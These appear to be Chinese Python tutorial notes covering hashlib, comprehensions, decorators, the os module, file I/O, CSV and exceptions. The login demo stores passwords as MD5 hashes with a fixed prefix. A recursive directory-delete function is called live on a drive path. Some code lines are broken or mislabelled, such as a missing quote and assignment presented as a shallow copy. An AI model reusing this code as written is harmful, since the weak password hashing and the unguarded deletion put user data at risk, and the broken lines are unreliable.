<p>d) hashlib  加密模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlibhash = hashlib.md5() <span class="comment"># md5  不可逆的 不可反解 但是加密是固定的 关系是一一对应 缺陷 可以被撞出来hash.update(bytes(&#x27;admin&#x27;,encoding=&quot;utf-8&quot;)) # 要对那个字符串进行加密# 输出加密的字符串print(hash.hexdigest()) # 拿到加密的字符串  21232f297a57a5a743894a0e4a801fc3hash2 =  hashlib.sha3_384() # 不同算法  hashlib很多加密的算法hash2.update(bytes(&#x27;admin&#x27;,encoding=&quot;utf-8&quot;))print(hash2.hexdigest())hash3 = hashlib.md5(bytes(&#x27;abd&#x27;,encoding=&quot;utf-8&quot;))&quot;&quot;&quot;如果没有参数 md5遵循一个规则 生成同一个对应关系 如果加了参数 就是在原来的基础上在一层加密  这样的话参数只有自己知道 防止被撞库因为别人永远那不不到这个参数&quot;&quot;&quot;hash3.update(bytes(&#x27;admin&#x27;,encoding=&#x27;utf-8&#x27;))print(hash3.hexdigest())&quot;&quot;&quot;模拟登陆和注册 要求：利用md5进行用户登陆网站进行注册之后密码加密的基本事例扩展：数据放入文本中  open(&#x27;文件路径&#x27;,&#x27;打开模式&#x27;)******* 模拟网站界面*****1.登录2.注册&quot;&quot;&quot;# 封装加密功能def md5_jiami(arg):    hash = hashlib.md5(bytes(&#x27;abcd&#x27;,encoding=&#x27;utf-8&#x27;)) # 如果加了参数 就是在原来的基础上在一层加密  这样的话参数只有自己知道 防止被撞库    hash.update(bytes(arg,encoding=&#x27;utf-8&#x27;)) # 要对那个字符串进行加密    return hash.hexdigest()# 封装注册功能def register(user,pwd):    with open(&quot;db.txt&quot;,&quot;a&quot;,encoding=&quot;utf-8&quot;) as f:        #数据 用户名+密码（加密？）        temp = user + &quot;|&quot; + md5_jiami(pwd) + &quot;\n&quot;        f.write(temp)# 封装登录功能def log(user,pwd):    with open(&#x27;db.txt&#x27;,&#x27;r&#x27;,encoding=&quot;utf-8&quot;) as f:        for line in f:           u,p = line.strip().split(&quot;|&quot;) # admin  da3177cbd9f064004b6a0d59a3a484bb           if u == user and p == md5_jiami(pwd):               return Trueprint(&quot;******* 模拟网站界面*****&quot;)print(&quot;1.表示登录 \n2.表示注册&quot;)i = input(&quot;请选择操作功能：&quot;)if i == &quot;2&quot;:    user = input(&quot;用户名:&quot;)    pwd = input(&quot;密码:&quot;)    register(user,pwd)elif i == &quot;1&quot;:    user = input(&quot;用户名:&quot;)    pwd = input(&quot;密码:&quot;)    res = log(user,pwd)    if res:        print(&quot;登录成功&quot;)    else:        print(&quot;登录失败&quot;)</span></span><br></pre></td></tr></table></figure>



<h2 id="迭代对象"><a href="#迭代对象" class="headerlink" title="迭代对象"></a>迭代对象</h2><h3 id="判断是否可是迭代对象"><a href="#判断是否可是迭代对象" class="headerlink" title="判断是否可是迭代对象"></a>判断是否可是迭代对象</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># from collections import Iterable # 判断是否是迭代对象  -- 是迭代对象# # isinstance()判断是否是迭代对象的方法# print(isinstance(&quot;abc&quot;,Iterable)) # True# print(isinstance([1,2,3],Iterable)) # True# print(isinstance(123,Iterable))list1 = list(&quot;一二三四五六七八九十&quot;)# 获取索引 和  值for i,v in enumerate(list1):    print(&quot;index:&quot;,i,&quot;values&quot;,v)</span></span><br></pre></td></tr></table></figure>

<h3 id="生成式"><a href="#生成式" class="headerlink" title="生成式"></a>生成式</h3><p>快速生成列表或者字典的方式</p>
<p>格式：</p>
<p>列表生成式</p>
<p>[列表中存放的元素 元素的来源 元素的筛选]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list0 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]<span class="comment"># 从上面数据中快速生成[2,4,6,8,10]# 不使用列表生成式# list1 = []# for item in list0:#     if item % 2 == 0:#         list1.append(item)# print(list1)# 列表生成式list2 = [item for item in list0 if item%2==0]print(list2)# 在上面的基础上 利用列表生成式 生成[4,16,36,64,100]list3 = [item**2 for item in list2]print(list3)# 判断某个数据是否指定的类型res = isinstance(123,str)print(res)list4 = [&quot;good&quot;,&quot;nice&quot;,12,&quot;day&quot;,&quot;up&quot;,88]# 只要字符串 不要数字res = [item for item in list4 if isinstance(item,str)]print(res)## 只要字符串 不要数字 字符串的字母变大写形态res = [item.upper() for item in list4 if isinstance(item,str)]print(res)</span></span><br></pre></td></tr></table></figure>

<p>字典生成式</p>
<p>{存放的元素k:v  元素的来源 元素的筛选}</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字典生成式dict0= &#123;&quot;语文&quot;:88,&quot;政治&quot;:76,&quot;历史&quot;:57,&quot;英语&quot;:55&#125;# 大于60分的科目dict1 = &#123;k:v for k,v in dict0.items() if v&gt;=60&#125;print(dict1)# 将原字典的键和值颠倒dict1 = &#123;v:k for k,v in dict0.items() if v&gt;=60&#125;print(dict1)</span></span><br></pre></td></tr></table></figure>

<h3 id="生成器-generator"><a href="#生成器-generator" class="headerlink" title="生成器  generator"></a>生成器  generator</h3><p>生成式  可以快速生成一批数据  — 这些数据是全部在内存中</p>
<p>python提供了生成器 – 需要去时候才会在内存中产生  不是一次性全部在内存中</p>
<p>定义生成器：</p>
<p>1.列表生成式设置小括号</p>
<p>2.结合函数和yield关键字 形成生成器</p>
<p>在生成器中怎么去获取数据？</p>
<h3 id="迭代器（另外的遍历方式）-Iterable"><a href="#迭代器（另外的遍历方式）-Iterable" class="headerlink" title="迭代器（另外的遍历方式） Iterable"></a>迭代器（另外的遍历方式） Iterable</h3><p>可以迭代对象 Iterable</p>
<p>凡是可以通过for循环遍历的统称称为可迭代对象</p>
<p>可以迭代的对象： 字符串 str  元组tuple 字典dict 集合set 列表list…</p>
<p>验证指定的类型：isinstance(数据,类型)</p>
<h2 id="高级函数"><a href="#高级函数" class="headerlink" title="高级函数"></a>高级函数</h2><h3 id="map-函数"><a href="#map-函数" class="headerlink" title="map()  函数"></a>map()  函数</h3><p>map(func, *iterables)</p>
<p>将序列中的元素依次作用于函数 将函数运行的结果存放在一个新的迭代器中</p>
<h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><p>将一个函数作用于序列 这个函数必须接受两个参数  reduce 把元素累计结果与下一个元素继续累计的过程</p>
<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>过滤 筛选</p>
<p>filter(function or None, iterable)</p>
<h3 id="sorted"><a href="#sorted" class="headerlink" title="sorted"></a>sorted</h3><p>排序</p>
<p>sorted(列表,key,reverse)</p>
<h2 id="函数补充"><a href="#函数补充" class="headerlink" title="函数补充"></a>函数补充</h2><p>函数的声明</p>
<p>函数的调用</p>
<p>递归</p>
<p>位置参数：传递的实参的顺序和声明的形参的顺序一致</p>
<p>默认参数：声明函数的时候可以给形参设置默认值 调用的时候如果不传值就是默认值 传值的话就是用传递的值</p>
<h3 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h3><p>例子：封装一个功能 求n个数的叠加和？</p>
<p>形参设置成可变参数</p>
<p>def 函数名(形参,*形参):</p>
<p>​        语句块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可变参数# 求n个数累计的和def add(*nums):    #print(type(nums)) # 元组    # 在函数中nums是一个元组；用于接受传递过来的所有实参的值    sum = 0    for item in nums:        sum+=item    return sum# res = add(1,2,33,55,10)# print(res)# 直接传递一个元组tuple0 = (34,56,88)# 调用函数res = add(*tuple0) # 在其赋值给函数的可变参数nums 不加* 报错print(res) # TypeError: unsupported operand type(s) for +=: &#x27;int&#x27; and &#x27;tuple&#x27;list0 = [1,2,3]res = add(*list0)print(res)</span></span><br></pre></td></tr></table></figure>

<p>关键字参数</p>
<p>关键字参数允许调用函数时 传入0个或者多个带有形参名的参数 这些数据会存放在函数内部自动形成一个字段</p>
<p>什么时候使用关键字参数？？？</p>
<p>例子：</p>
<p>注册信息</p>
<p>必填项 — 固定的形参</p>
<p>选填项 — 关键字参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关键字参数# 选填项就要用关键字参数  字段名=数据def accept_data(username,password,**argus):    print(username,password,argus)# 调用函数accept_data(&quot;开群&quot;,&quot;5201314&quot;,email=&quot;860152299@qq.com&quot;,sex=&quot;女&quot;)dict0 = &#123;&#x27;email&#x27;: &#x27;860152299@qq.com&#x27;, &#x27;sex&#x27;: &#x27;女&#x27;&#125;# 通过字典传值accept_data(&quot;小群群&quot;,&quot;1314520&quot;,**dict0)</span></span><br></pre></td></tr></table></figure>

<p>闭包  –  nonlocal 关键字（闭包）</p>
<p>在函数A声明函数B 并且函数A的返回值是函数B — 这种形式称之为闭包（closure）</p>
<p>global 关键字</p>
<p>如果在函数内部使用全局变量 需要先对其进行global标记</p>
<p>外部函数的局部变量在内部函数使用时 需要将其nonlocal标记</p>
<p>注意：如果不进行标记 会默认认为那个变量是在内部函数里面声明的 与 外部函数的变量只是同名而已</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 闭包# def func_a():#     def func_b():#         print(&quot;内部函数B&quot;)#     def func_c():#         print(&quot;内部函数C&quot;)#     return func_b# res = func_a()# res()#func_a()()# func_b()  在函数内部声明的内容 函数外部获取不到的# 作用域# 变量作用域：全局变量 和 局部变量a = 50 # 全局变量def func_a():    # global a    # a = 500 # 局部变量    num = 10    def func_b():        print(&quot;内部函数B&quot;)        nonlocal num        num = 100        print(&quot;内部函数B&quot;,num)    def func_c():        print(&quot;内部函数C&quot;)    func_b()    print(&quot;外部函数：&quot;,num)    return func_bres = func_a()print(res)# print(a)</span></span><br></pre></td></tr></table></figure>

<p>装饰器</p>
<p>装饰器的作用：为已经存在的函数添加新的功能  不会对原来功能增加影响</p>
<p>功能：</p>
<p>打印九九乘法表？</p>
<p>计算这个功能执行需要的时间？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印九九乘法表def table():    for i in range(1,10):        for j in range(1,i+1):            print(j,&quot;*&quot;,i,&quot;=&quot;,i*j,end=&quot; \t&quot;)        print(&quot;&quot;)import time# start = time.time()# table()# end = time.time()# print(end-start)# 想计算每个功能执行的时间def get_time(func):    start = time.time()    func()    end = time.time()    print(&quot;耗时&quot;,end-start)def nums():    for s in range(1,1000000):        print(s)get_time(nums)</span></span><br></pre></td></tr></table></figure>

<p>装饰器的格式本身就是一个闭包</p>
<p>在不修改原来的功能的基础上增加新的功能【新的功能 可以增加 也可以不增加】</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outter_name</span>(<span class="params">func</span>):</span>    <span class="function"><span class="keyword">def</span> <span class="title">inner_name</span>(<span class="params">*value,**argus</span>):</span>        <span class="comment"># 增加的功能        res = func(*value,**argus)        return res    return inner_name</span></span><br></pre></td></tr></table></figure>





<p>偏导函数</p>
<p>例子：将一个数据转换为整数</p>
<p>int()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 偏函数&quot;&quot;&quot;int(x, base=10)--- 常用的状态十进制为基础&quot;&quot;&quot;res= int(&quot;10&quot;,base=2)print(res) # 0000 0000 # 2def int1(value):    return int(value,base=2)res = int1(&quot;0010&quot;)print(res)# 系统也提供了设置偏函数的功能import  functoolsint2 = functools.partial(int,base=2)res = int2(&quot;1001&quot;)print(res)</span></span><br></pre></td></tr></table></figure>

<p>匿名函数</p>
<p>声明函数时 都有函数名</p>
<p>带有函数名的函数是有一个弊端的</p>
<p>起函数名— 见名知意</p>
<p>求两个数的和？</p>
<p>def add(a,b):</p>
<p>​    return a+b</p>
<p>求三个数的和？</p>
<p>def add(a,b,c):</p>
<p>​    return a+b+c</p>
<p>在一个模块中 声明两个同名的函数 第二函数就会把原来的函数覆盖掉</p>
<p>简单的函数就可以使用匿名函数来完成</p>
<p>匿名函数的格式：</p>
<p>lambda 函数的参数:执行的语句</p>
<p>执行语句注意：只有一条语句  一般这条语句被视为返回语句</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># def add(a,b):#     return a+bf = lambda a,b:a+bprint(f)res = f(12,34)print(res)# def add(a,b,c):#     return a+b+cadd = lambda a,b,c:a+b+cprint(add(1,2,3))# res = add(1,2)# print(res) # 第二个会把第一个覆盖掉</span></span><br></pre></td></tr></table></figure>

<p>预习： </p>
<p>1.os模块</p>
<p>2.关于文件读写的操作（IO输入输出机制） </p>
<h2 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h2><p><img src="C:\Users\Administrator\Desktop\360截图20210615221355949.jpg" class="lazyload" data-srcset="C:\Users\Administrator\Desktop\360截图20210615221355949.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="360截图20210608203821802"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[re.sub(r&#x27;\xa0|\t|\n|\s&#x27;,&#x27;&#x27;,i)for i in sho] 替换 </span><br></pre></td></tr></table></figure>

<p>​            其中没填括号的代表不需要的比如空格什么的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h2><p>提供了很多的方法来处理磁盘上的文件和目录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os<span class="comment"># 1.获取当前的操作系统的名称name = os.nameprint(name) # nt -- windows posix--Liunx/Mac# 获取系统的信息# res = os.uname()  # windows 下是不支持 Mac/Liunx下才有结果# print(res)# 获取环境变量env =  os.environprint(env)# 获取某一个的环境变量对应的值res = os.environ.get(&quot;Path&quot;)print(res)&quot;&quot;&quot;绝对路径:从盘符开始 到目的的文件结束D:\Anaconda3\demo.txt相对路径：参照物    C:        test            a.txt            m.py            subtest                b.txt        test1            c.txt参照物是m.py文件需求：    想在m.py中获取a.txt这个路径（平级的直接就写文件名称即可） a.txt    想在m.py中获取b.txt这个路径 (subtest\b.txt)    想在m.py中获取c.txt这个路径 (..\test1\c.txt). --- 当前路径.. --- 上一级路径&quot;&quot;&quot;# 获得当前文件所在的当前路径path = os.curdir # 当前路径print(path) # .# 获得当前文件所在的目录path = os.getcwd()print(path)# D:\pythonobj\ch14\os_pack# 获得指定目录下的所有子目录或者子文件的名字path = r&quot;D:\pythonobj&quot;path_list = os.listdir(path)print(path_list)# 创建目录&quot;&quot;&quot;make directory 创建文件夹&quot;&quot;&quot;#os.mkdir(&quot;test_dir&quot;) # 相对路径# 多级目录 mkdir不行 创建一级#os.mkdir(r&quot;D:\pythonobj\ch14\os_pack\test&quot;)# 想多级目录#os.makedirs(r&quot;D:\pythonobj\ch14\os_pack\test1\test2\test3&quot;)# 删除目录#os.rmdir(&quot;test_dir&quot;)# 删除只能删除空目录（删除只会删除最后一级目录）#os.rmdir(r&quot;D:\pythonobj\ch14\os_pack\test1\test2\test3&quot;)# 创建文件  -- 注：后面文件的输入输出详细讲解# 打开一个文件 执行的写的操作  打开这个文件的时候 如果文件不存在 则创建#open(&quot;test.txt&quot;,&quot;w&quot;)# 删除文件#os.remove(&quot;test.txt&quot;)# 获取文件的信息#res = os.stat(&quot;os_demo.py&quot;)  # 存在问题   传入文件名  路径地址#print(res)# 重命名#os.rename(&quot;修改目录&quot;,&quot;原目录&quot;)# 重命名目录#os.rename(r&quot;D:\pythonobj\ch14\os_pack\test1&quot;,r&quot;D:\pythonobj\ch14\os_pack\test3&quot;)# 有些对文件的操作是存在os.path下# 文件的绝对路径ab_path = os.path.abspath(&quot;.&quot;)print(ab_path) # D:\pythonobj\ch14\os_pack# 拼接路径join_path = os.path.join(&quot;路径&quot;,&quot;文件名)print(join_path) # D:\pythonobj\ch14\os_pack\os_demo.py# 拆分路径 最后的返回结果1个元组 (“前半部分路径”，“最后一级的路径名”)res = os.path.split(ab_path)print(res)# 获取指定路径的扩展名分为两个路径(前半部分路径，文件的扩展名)# 注：如果指定的路径是一个目录的话 扩展名的部分就是空字符res = os.path.splitext(join_path)print(res)# 获取指定路径的 最后一级的名字file_name = os.path.basename(ab_path)print(file_name)# 获取指定路径的 最后一级前的所有路径dir_name = os.path.dirname(ab_path)print(dir_name)# 获取文件的大小file_size = os.path.getsize(join_path)print(file_size) # 字节 B -- KB -- MB -- GB -- TB -- PB -- EB -- ZB -- YB -- BB -- NB -- DB -- CB -- XB# 判断操作# 1.判断指定目录是否绝对路径res = os.path.isabs(join_path)print(res) # True# 2.判断指定路径是不是目录/文件夹res = os.path.isdir(ab_path)print(res)# 3.判断是否是文件res= os.path.isfile(join_path)print(res)# 判断指定路径在计算机中是否存在res = os.path.exists(&quot;w:\s&quot;)print(res)&quot;&quot;&quot;练习：获取指定目录下 后缀为.wmv的文件路径      扩展：想获取指定目录下所有的文件&quot;&quot;&quot;path = r&quot;C:\Users\Administrator\Desktop\数据分析5班\2021-4-6\video&quot;dir_list = os.listdir(path)for file_name in dir_list:    if file_name.endswith(&quot;.wmv&quot;):        print(os.path.join(path,file_name))# 想获取指定目录下所有的文件&quot;&quot;&quot;test    a.txt    b.txt    subtest        1.txt        2.txt        sub_tets            l.txt            m.txt&quot;&quot;&quot;# 目录中 所有的文件def get_file(path):    # 判断路径是否存在    if not os.path.exists(path):        return    if os.path.isfile(path):        print(&quot;只接受目录&quot;)        return    file_list = os.listdir(path)    for file_name in file_list:        # 判断路径下是否文件路径        join_path = os.path.join(path,file_name)        # 判断整个路径        if os.path.isfile(join_path):            print(join_path)        else:            get_file(join_path) # 在去找# get_file(r&quot;d:\\&quot;)&quot;&quot;&quot;删除指定目录&quot;&quot;&quot;def delete_file(path):    # 判断路径是否存在    if not os.path.exists(path):        return    if os.path.isfile(path):        print(&quot;只接受目录&quot;)        return    file_list = os.listdir(path)    for file_name in file_list:        # 判断路径下是否文件路径        join_path = os.path.join(path, file_name)        # 判断整个路径        if os.path.isfile(join_path):            os.remove(join_path)            print(join_path,&quot;已删除&quot;)        else:            delete_file(join_path)  # 在去找    # 遍历删除完成后 该目录成了空目录    os.rmdir(path)delete_file(r&quot;E:\pythonobj&quot;)</span></span><br></pre></td></tr></table></figure>



<h2 id="关于文件的读写操作（IO输入输出机制）"><a href="#关于文件的读写操作（IO输入输出机制）" class="headerlink" title="关于文件的读写操作（IO输入输出机制）"></a>关于文件的读写操作（IO输入输出机制）</h2><p><img src="C:\Users\Administrator\Desktop\360截图20210608204231109.jpg" class="lazyload" data-srcset="C:\Users\Administrator\Desktop\360截图20210608204231109.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="360截图20210608204231109"></p>
<p>​            当为字典时，想要写入，可以通过json直接写入  ，后面的传参代表不自动转换编码</p>
<p>输入输出是有参照物的</p>
<p>输入：将内容读取到程序的过程  — 输入过程</p>
<p>输出：将内容从程序中写出去的过程 – 输出过程</p>
<p>文件：存储在外部介质（磁盘文件、网络数据）上的数据和信息的集合</p>
<p>注：操作的数据流</p>
<p>首先 打开文件  – 编写数据</p>
<p>首先  打开文件 – 在程序中的通过介质关联文件  获得文件的手柄</p>
<p>格式：handle = open(“文件路径”,”打开方式”)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">打开模式：r  (read)   ---- 只读操作  要求文件必须存在w  (write)  ---- 只写模式  如果文件不存在 会创建文件  存在将文件原来的内容清空x  			---- 写入模式  要求文件是存在的a  (append) ---- 只写模式  如果文件不存在 会创建文件 如果文件存在会在原来的基础上进行拼接r+  w+ x+  a+ ----- 可以进行读和写带有b的模式    --- 以二进制的形式对文件进行读写操作   读出/写入的是数据的字节格式rb  wb  xb abrb+ wb+ xb+ ab+程序本身无法处理程序外部的垃圾【读和写的过程中产生垃圾 程序无法处理】当文件处理完毕后 记得关闭处理通道 防止产出通道垃圾（程序无法处理）handle.close()</span><br></pre></td></tr></table></figure>

<h3 id="对文件进行读取操作"><a href="#对文件进行读取操作" class="headerlink" title="对文件进行读取操作"></a>对文件进行读取操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read([size]) 不写参数的话 一次性将文件中的内容全部读取出来传入size大小   一次性读取&lt;=size个字符的数据readline()将数据一行一行的进行读取readlines()读取所有的行  将每一行当做一个元素存放在列表中</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.打开文件获取文件的操作手柄# r 读取的是字符数据  记住可能存在编码问题  设置编辑集  utf-8handle = open(&quot;hello.txt&quot;,&quot;r&quot;,encoding=&quot;gbk&quot;)# 调用读取的函数 read# res = handle.read()# print(res)# 获取文件指针位置pos = handle.tell()print(pos)# 按字节读取&quot;&quot;&quot;r 按照字符个数读取rb  按照字节数读取&quot;&quot;&quot;res = handle.read(5)print(res) # 5个字# 获取文件指针位置pos = handle.tell()print(pos) # gbk 2字节 utf-8 3个字节# 如果还想在读取前面的数据 需要移动文件指针到指定的位置handle.seek(0)# res = handle.read(1)# print(res)# readline 一行一行的读取 读取的时候换行读取出来\n# line = handle.readline()# print(line)# line = handle.readline()# print(line)# # 循环遍历# readlines 读取多行 将每一行当做元素存储在列表中lines = handle.readlines()print(lines)# 关闭通道handle.close()</span></span><br></pre></td></tr></table></figure>

<h3 id="对文件进行写的操作"><a href="#对文件进行写的操作" class="headerlink" title="对文件进行写的操作"></a>对文件进行写的操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write(<span class="built_in">str</span>/字节数据)将字符串写入到文件中 根据写入的模式来判定写入的内容 a/w  --字符串 ab/wb 写入就是字节数据writelines(序列)将序列中的内容写入到文件中</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写的操作handle = open(&quot;hello.txt&quot;,&quot;a&quot;)handle.write(&quot;\n这首诗叫做静夜思&quot;)# 按序列写入内容list0 = [&quot;小乔流水人家\n&quot;,&quot;古道西风瘦马\n&quot;,&quot;夕阳西下\n&quot;,&quot;断肠人在天涯&quot;]# handle.writelines(list0)for item in list0:    handle.write(item)handle.close()</span></span><br></pre></td></tr></table></figure>

<h3 id="二进制写入"><a href="#二进制写入" class="headerlink" title="二进制写入"></a>二进制写入</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 二进制写入handle = open(&quot;hello.txt&quot;,&quot;wb&quot;)# 写进去的就是字节数据 如果是带b模式只能写入字节数据handle.write(&quot;\n离离原上草&quot;.encode(&#x27;gbk&#x27;))# 如果遇到写入不成功 可以执行刷新handle.flush()handle.close()</span></span><br></pre></td></tr></table></figure>

<h2 id="案例：学员管理系统"><a href="#案例：学员管理系统" class="headerlink" title="案例：学员管理系统"></a>案例：学员管理系统</h2><p>功能：1.添加学员    2.修改学员    3.查询学员    4.删除学员    0.退出程序</p>
<p>注：根据编号选择对应的功能</p>
<p>学员字段：序号、姓名、年龄、性别、手机号</p>
<p>查询学员：a.查询所有学员    b.姓名查询  </p>
<p>修改学员：选查询是否有这个学员存在，在进行修改</p>
<p>删除学员：选查询是否有这个学员存在 a.通过序号删除   b.删除全部学员  c.根据名字删除</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">例子：<span class="comment">#系统界面while 1:    print(&quot;**********************学员管理系统**********************&quot;)    print(&quot;**********************1.添加学员**********************&quot;)    print(&quot;**********************2.修改学员**********************&quot;)    print(&quot;**********************3.查询学员**********************&quot;)    print(&quot;**********************4.删除学员**********************&quot;)    print(&quot;**********************0.退出程序**********************&quot;)    num = int(input(&quot;请选择你的操作：&quot;))    if num == 1:        pass    elif num==2:        pass    elif num==3:        pass    elif num==4:        pass    else:        print(&quot;退出程序&quot;)        break</span></span><br></pre></td></tr></table></figure>

<h2 id="深拷贝，浅拷贝"><a href="#深拷贝，浅拷贝" class="headerlink" title="深拷贝，浅拷贝"></a>深拷贝，浅拷贝</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#深拷贝，包含对象里面的自对象的拷贝，所以原始对象的改变不会造成深拷贝里任何子元素的改变import copyalist=`[``1``,``2``,``3``,[``&quot;a&quot;``,``&quot;b&quot;``]]`d=copy.deepcopy(alist)#copy浅拷贝，没有拷贝子对象，所以原始数据改变，子对象会改变\&gt;&gt; b=alist\&gt;&gt;&gt; print b[1, 2, 3, [&#x27;a&#x27;, &#x27;b&#x27;]]\&gt;&gt;&gt; alist.append(5)\&gt;&gt;&gt; print alist;print b[1, 2, 3, [&#x27;a&#x27;, &#x27;b&#x27;], 5][1, 2, 3, [&#x27;a&#x27;, &#x27;b&#x27;], 5]</span></span><br></pre></td></tr></table></figure>



<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>直接将对象存放与文件中  这个过程称之为序列化</p>
<p>在文件中读取对象的过程称之为反序列化</p>
<p>python提供了pickle模块实现序列化</p>
<h2 id="CSV操作读写"><a href="#CSV操作读写" class="headerlink" title="CSV操作读写"></a>CSV操作读写</h2><p>1.向csv文件中写入数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pa<span class="comment"># data = pa.DataFrame(dict(item))# data.to_csv(&#x27;医药.csv&#x27;,mode=&#x27;a&#x27;,header=False,index=False,sep=&#x27;|&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>(1) 列表方式写入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列表方式写入csvimport csv# 当前上下文操作 with  自动关闭通道with open(&quot;data.csv&quot;,&quot;a+&quot;,encoding=&quot;utf-8&quot;,newline=&#x27;&#x27;) as csvfile:    # csv 写入操作对象    writer = csv.writer(csvfile)    # 写入一行    writer.writerow([&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;])    # 写入多行    writer.writerows([[0,1,3],[1,2,3],[2,3,4]]) # 以二维列表方式进行写入    </span></span><br></pre></td></tr></table></figure>



<p>(2)字典方式写入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字典方式的写入csvimport csvwith open(&quot;data2.csv&quot;,&quot;a+&quot;,encoding=&quot;gbk&quot;,newline=&quot;&quot;) as csvfile:    # 字典 name:张三 sex:男    filename = &#123;&#x27;name&#x27;,&#x27;sex&#x27;&#125;    # 写入标题    writer = csv.DictWriter(csvfile,fieldnames=filename)    writer.writeheader()    # 写入内容    writer.writerow(&#123;&#x27;name&#x27;:&#x27;开群&#x27;,&#x27;sex&#x27;:&#x27;男&#x27;&#125;)    writer.writerow(&#123;&#x27;name&#x27;: &#x27;嘉豪&#x27;, &#x27;sex&#x27;: &#x27;男&#x27;&#125;)    writer.writerow(&#123;&#x27;name&#x27;: &#x27;小东&#x27;, &#x27;sex&#x27;: &#x27;男&#x27;&#125;)   </span></span><br></pre></td></tr></table></figure>

<p>2.读取csv文件中的内容</p>
<p>(1).列表方式的读取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列表方式的读取import csvwith open(&#x27;data.csv&#x27;,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as csvfile:    # 读取的对象    reader = csv.reader(csvfile)    for row in reader:        print(row,row[0]) # 读取出来的内容是列表格式的  0</span></span><br></pre></td></tr></table></figure>

<p>(2).字典方式的读取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字典方式的读取import csvwith open(&#x27;data2.csv&#x27;,&#x27;r&#x27;,encoding=&#x27;gbk&#x27;) as csvfile:    reader = csv.DictReader(csvfile)    for row in reader:        print(row[&#x27;sex&#x27;]) # 可以直接通过键的名称取值</span></span><br></pre></td></tr></table></figure>

<h2 id="异常机制"><a href="#异常机制" class="headerlink" title="异常机制"></a>异常机制</h2><p>什么是异常？</p>
<p>在程序中异常是不期而遇的各种状态</p>
<p>NameError</p>
<p>ValueError</p>
<p>TypeError</p>
<p>FileNotFound</p>
<p>…</p>
<p>异常机制：</p>
<p>出现异常的时候Python解释器会自动在出现错误的地方生成一个异常对象，而Python解释器在出现异常的位置查看是否有处理异常的操作 如果没有异常抛出 由Python解释器捕获这个异常对象导致程序终止</p>
<p>在程序中手动捕获异常 避免程序异常终止</p>
<p>捕获方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try:	可能出现的异常代码except 异常类型 as 变量:	变量就是用于接受 Python解释器抛出的异常对象except 异常类型n as 变量n:	passelse:	当try中没有异常的时候执行</span><br></pre></td></tr></table></figure>

<p>练习：</p>
<p>控制用户输入一个整数</p>
